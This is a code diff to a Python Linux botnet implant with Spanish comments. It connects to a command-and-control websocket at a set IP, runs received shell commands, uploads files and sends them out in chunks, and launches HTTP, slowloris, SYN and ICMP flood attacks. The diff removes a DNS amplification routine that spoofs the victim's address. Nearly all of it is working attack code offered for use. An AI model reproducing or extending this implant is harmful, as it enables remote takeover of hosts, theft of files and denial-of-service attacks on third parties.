@@ -17,7 +17,7 @@ import netifaces
 from websockets import connect
 from websockets.exceptions import ConnectionClosedError
 from typing import List, Dict, Tuple, Optional
-from scapy.all import IP, UDP, DNS, DNSQR, send, Raw
+#from scapy.all import IP, UDP, DNS, DNSQR, send, Raw
 import requests
 
 class LinuxImpl:
@@ -56,7 +56,7 @@ class LinuxImpl:
         try:
             cmd = await ws.recv()
             data = json.loads(cmd.replace("'", '"'))
-            print(f"[+] Comando recibido: {data}")
+
             
             if 'cmd' in data:
                 await self._execute_command(ws, data['cmd'])
@@ -69,13 +69,11 @@ class LinuxImpl:
             elif 'attack' in data:
                 await self._handle_attack_command(ws, data)
             elif 'stop_attack' in data:
-                await self._stop_attack(ws)
+                await self._stop_attack(ws, attack_type=data['stop_attack'])
         
         except ConnectionClosedError:
-            print("[-] Conexión cerrada por el servidor")
-            raise
+            pass
         except Exception as e:
-            print(f"[-] Error procesando comando: {e}")
             await ws.send(json.dumps({"error": str(e)}))
     
     async def _execute_command(self, ws, command: str) -> None:
@@ -147,7 +145,7 @@ class LinuxImpl:
                 self.upload_destination = None
                 
                 await ws.send(json.dumps({
-                    "status": "success",
+                    "status": "upload_complete",
                     "message": f"Archivo recibido en {self.upload_destination}"
                 }))
         
@@ -207,16 +205,29 @@ class LinuxImpl:
             }))
             return
         
+        CHUNK_SIZE = 64 * 1024
         try:
             with open(file_path, "rb") as f:
                 content = base64.b64encode(f.read()).decode("utf-8")
+
+
+                while True:
+                    chunk = f.read(CHUNK_SIZE)
+                    if not chunk:
+                        break
+
+                    encoded = base64.b64encode(chunk).decode("utf-8")
+                    is_last = f.tell() == os.path.getsize(file_path)
+
+                    await ws.send(json.dumps({
+                        "filename": os.path.basename(file_path),
+                        "path": file_path,
+                        "chunk": encoded,
+                        "last": is_last
+                    }))
+                    
+                    await asyncio.sleep(0)  # cede control para evitar bloquear el bucle
             
-            await ws.send(json.dumps({
-                "filename": os.path.basename(file_path),
-                "path": file_path,
-                "content": content,
-                "status": "success"
-            }))
         except Exception as e:
             await ws.send(json.dumps({
                 "error": str(e),
@@ -255,15 +266,10 @@ class LinuxImpl:
             }))
         else:
             for attack in self.attacks:
-                print("loop")
                 if attack_type == attack['type']:
-                    print(f"already running {attack_type} {attack['type']}")
+                    pass
                 else:
-                    
-                    # Obtener el bucle de eventos actual
                     loop = asyncio.get_event_loop()
-                    
-                    # Iniciar nuevo ataque
                     
                     attack_thread = threading.Thread(
                         target=self._execute_attack,
@@ -301,8 +307,6 @@ class LinuxImpl:
                 self._syn_flood_attack(target, end_time, stop_thread)
             elif attack_type == "icmp_flood":
                 self._icmp_flood_attack(target, end_time, stop_thread)
-            elif attack_type == "dns_amplification":
-                self._dns_amplification_attack(target, end_time, stop_thread)
             else:
                 print(f"[!] Tipo de ataque no reconocido: {attack_type}")
         except Exception as e:
@@ -366,21 +370,20 @@ class LinuxImpl:
 
         """Ataque de inundación HTTP"""
         import urllib.request
-        # 1. Verificar formato del target
+        
         if not target.startswith(('http://', 'https://')):
-            target = 'http://' + target  # Asumir HTTP si no se especifica
+            target = 'http://' + target  
         
-        # 2. Configurar timeout para no bloquear el ataque
-        socket.setdefaulttimeout(5)  # 5 segundos
         
-        # 3. Headers básicos para evitar bloqueos
+        socket.setdefaulttimeout(5)  
+        
+        
         headers = {
             'User-Agent': 'Mozilla/5.0',
             'Accept': '*/*',
-            'Connection': 'close'  # No mantener conexiones vivas
+            'Connection': 'close'
         }
         
-        # 4. Preparar la solicitud
         request = urllib.request.Request(
             url=target,
             headers=headers,
@@ -389,14 +392,11 @@ class LinuxImpl:
         
         print(f"[*] Iniciando HTTP Flood a {target}")
         
-        # 5. Bucle principal de ataque
         while time.time() < end_time and not stop_thread.is_set():
             try:
-                # 6. Enviar petición y leer algo de respuesta
                 with urllib.request.urlopen(request) as response:
-                    response.read(64)  # Leer mínimo para consumir recursos
+                    response.read(64)  
                 
-                # 7. Pequeña pausa para evitar saturación local
                 time.sleep(0.01)
                 
             except urllib.error.URLError as e:
@@ -404,7 +404,7 @@ class LinuxImpl:
                 break
             except Exception as e:
                 print(f"[!] Error: {str(e)}")
-                time.sleep(1)  # Esperar antes de reintentar
+                time.sleep(1)  
         
         print("[*] Ataque HTTP Flood finalizado")
     
@@ -428,8 +428,6 @@ class LinuxImpl:
                 except:
                     self._close_sockets(sockets)
                     sockets = []
-                
-                # Mantener conexiones vivas
                 for s in sockets:
                     try:
                         s.send("X-a: b\r\n".encode())
@@ -447,12 +445,10 @@ class LinuxImpl:
         
         while time.time() < end_time and not stop_thread.is_set():
             try:
-                # Crear socket raw requiere permisos de administrador
                 s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                 s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                 
-                # Paquete SYN simplificado (en realidad necesitarías construir los headers correctamente)
-                packet = b'\x00' * 64  # Placeholder
+                packet = b'\x00' * 64 
                 s.sendto(packet, (target_ip, target_port))
                 s.close()
             except:
@@ -470,44 +466,6 @@ class LinuxImpl:
                 pass
     
 
-    def _dns_amplification_attack(self, target: str, end_time: float, stop_thread) -> None:
-        """Ataque de amplificación DNS con IP spoofing"""
-        # Lista de servidores DNS abiertos (considera usar una lista más grande)
-        dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9"]
-        target_ip = target.split(":")[0]
-        
-        # Dominios con respuestas grandes para mayor amplificación
-        large_domains = [
-            "example.com", 
-            "isc.org", 
-            "ripe.net",
-            "google.com",
-            "microsoft.com"
-        ]
-        
-        while time.time() < end_time and not stop_thread.is_set():
-            try:
-                for dns_server in dns_servers:
-                    # Seleccionar un dominio aleatorio
-                    domain = random.choice(large_domains)
-                    
-                    # Crear paquete DNS con Scapy para mayor control
-                    # Usamos tipo ANY (255) o TXT para respuestas más grandes
-                    dns_query = IP(dst=dns_server, src=target_ip)/UDP(sport=random.randint(1024, 65535), dport=53)/DNS(
-                        rd=1,
-                        qd=DNSQR(qname=domain, qtype="ANY")
-                    )
-                    
-                    # Enviar el paquete con IP falsificada
-                    send(dns_query, verbose=0)
-                    
-                    # Pequeña pausa para evitar saturación local
-                    time.sleep(0.01)
-                    
-            except Exception as e:
-                pass
-
-
     def _close_sockets(self, sockets: list) -> None:
         """Cierra todos los sockets en la lista"""
         for s in sockets:
@@ -522,7 +480,6 @@ class LinuxImpl:
 
         if len(attack_type) == 0:
             for attack in self.attacks[:]:
-                #if attack['thread'].is_alive():
                 attack['stop_thread'].set()
                 attack['thread'].join(timeout=5)
                 asyncio.run_coroutine_threadsafe(
@@ -555,8 +512,13 @@ class LinuxImpl:
             'impl_id': self.impl_id
         }
  
-        print(f"[+] Implante registrado: {model}")
-        req = requests.post(f"http://localhost:4000/api/impl/new/{model['impl_id']}", data=model)
+        #print(f"[+] Implante registrado: {model}")
+
+        try:
+            req = requests.post(f"http://192.168.32.1:4000/api/impl/new/{model['impl_id']}", data=model)
+            print("dsada",  req)
+        except Exception as e:
+            print(e)
 
     @property
     def impl_id(self) -> str:
@@ -571,14 +533,12 @@ class LinuxImpl:
             pass
         
         try:
-            # Si no hay machine-id, usar el ID de la interfaz de red
             macs = self._get_macs()
             if macs and macs[0] != 'undefined':
                 return macs[0].replace(':', '')
         except:
             pass
         
-        # Como último recurso, generar un UUID
         return str(uuid.uuid4())
     
     def _get_macs(self) -> List[str]:
@@ -636,8 +596,7 @@ class LinuxImpl:
         sys.exit(1)
 
 if __name__ == "__main__":
-    # Configuración del implante
-    C2_WS_URL = "ws://localhost:4000/api/rcv"
+    C2_WS_URL = "ws://192.168.32.1:4000/api/rcv"
     GROUP_NAME = "grupo1"
     
     impl = LinuxImpl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
